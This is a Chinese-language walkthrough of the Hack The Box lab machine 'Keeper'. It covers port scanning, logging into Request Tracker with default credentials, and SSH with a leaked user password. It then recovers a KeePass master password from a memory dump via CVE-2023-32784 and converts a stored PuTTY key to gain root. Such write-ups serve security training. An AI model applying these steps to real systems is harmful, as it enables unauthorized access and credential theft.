# 扫描
```
┌──(root㉿kali)-[~/htb/Keeper]
└─# nmap -p- --open -Pn 10.10.11.227         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-12 03:31 EST
Nmap scan report for 10.10.11.227
Host is up (1.1s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 187.65 seconds

```

# foothold

谷歌搜索：```rt 4.4.4+dfsg-2ubuntu1 default password```

找到[这个页面](https://docs.bestpractical.com/rt/4.4.4/README.html)

默认凭据：root:password

登录以后在后台找到一个用户的凭据：
lnorgaard:Welcome2023!


ssh登录拿到立足点：

```
┌──(root㉿kali)-[~/htb/Keeper]
└─# ssh lnorgaard@10.10.11.227                                                                 
The authenticity of host '10.10.11.227 (10.10.11.227)' can't be established.
ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.227' (ED25519) to the list of known hosts.
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Tue Dec 12 09:23:17 2023 from 10.10.14.154
lnorgaard@keeper:~$ whoami
lnorgaard
lnorgaard@keeper:~$ cat user.txt 
8d7e3172091eb6d216...

```

# 提权

home目录很多文件
```
lnorgaard@keeper:~$ ls -alh
total 408M
drwxr-xr-x 4 lnorgaard lnorgaard 4.0K Dec 12 10:45 .
drwxr-xr-x 3 root      root      4.0K May 24  2023 ..
lrwxrwxrwx 1 root      root         9 May 24  2023 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard  220 May 23  2023 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard 3.7K May 23  2023 .bashrc
drwx------ 2 lnorgaard lnorgaard 4.0K May 24  2023 .cache
-rwxr-x--- 1 lnorgaard lnorgaard 242M May 24  2023 KeePassDumpFull.dmp
-rw-rw-r-- 1 lnorgaard lnorgaard  15K Dec 12 07:24 keepass_dump.py
-rw-rw-r-- 1 lnorgaard lnorgaard   14 Dec 12 10:45 o.txt
-rwxr-x--- 1 lnorgaard lnorgaard 3.6K May 24  2023 passcodes.kdbx
-rw------- 1 lnorgaard lnorgaard  807 May 23  2023 .profile
-rw-r--r-- 1 root      root       84M Dec 12 11:06 RT30000.zip
-rw-r--r-- 1 lnorgaard lnorgaard  83M Dec 12 10:36 RT30000.zip.gz
drwx------ 2 lnorgaard lnorgaard 4.0K Jul 24 10:25 .ssh
-rw-r----- 1 root      lnorgaard   33 Dec 12 06:15 user.txt
-rw-r--r-- 1 root      root        39 Jul 20 19:03 .vimrc


```

拷贝到本地，尝试破解
```
┌──(root㉿kali)-[~/htb/Keeper]
└─# scp lnorgaard@10.10.11.227:/home/lnorgaard/passcodes.kdbx .
lnorgaard@10.10.11.227's password: 
passcodes.kdbx                                                 100% 3630     3.5KB/s   00:01    
                                                                                                 
┌──(root㉿kali)-[~/htb/Keeper]
└─# ls                                                                                         
passcodes.kdbx
                                                                                                 
┌──(root㉿kali)-[~/htb/Keeper]
└─# keepass2john passcodes.kdbx >keep.hash
                                                                                                 
┌──(root㉿kali)-[~/htb/Keeper]
└─# john keep.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status


```

貌似无法破解


下载RT30000.zip，里面包含了KeePassDumpFull.dmp

使用[CVE-2023-32784](https://github.com/vdohney/keepass-password-dumper)


还原master key
```
C:\Users\max\Downloads\keepass-password-dumper-main\keepass-password-dumper-main>dotnet run KeePassDumpFull.dmp

...

Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

上面密码无法打开passcodes.kdbx

谷歌搜索```dgrød med fløde```，显示```您是不是要找： rødgrød med fløde```

看起来应该是上面的工具没有完全还原密码

密码应该是：```rødgrød med fløde```

## putty to openssh

root的密码无法用ssh连接，报密码错误

但是notes显示了一段加密信息，把它复制为key.ppk 文件

准备
```
┌──(root㉿kali)-[~/htb/Keeper]
└─# cat key.ppk         
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQA...
...
...cax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0

┌──(root㉿kali)-[~/htb/Keeper]
└─# puttygen key.ppk -O private-openssh -o root_id_rsa

```

还原了一个ssh秘钥

```
┌──(root㉿kali)-[~/htb/Keeper]
└─# cat root_id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAp....
....
....u5+yOc636Bspy82JHd3
BE5xsjTZIzI66HH5sX5L7ie7JhBTIO2csFuwgVihqM4M+u7Ss/SL
-----END RSA PRIVATE KEY-----

```


拿到root权限
```
┌──(root㉿kali)-[~/htb/Keeper]
└─# chmod 600 root_id_rsa                                                                      
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/htb/Keeper]
└─# ssh -i root_id_rsa root@10.10.11.227                                                       
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Wed Dec 13 01:50:41 2023 from 10.10.16.19
root@keeper:~# ls
root.txt  RT30000.zip  SQL
root@keeper:~# cat root.txt
0180128a2d2ee7...
root@keeper:~# 

```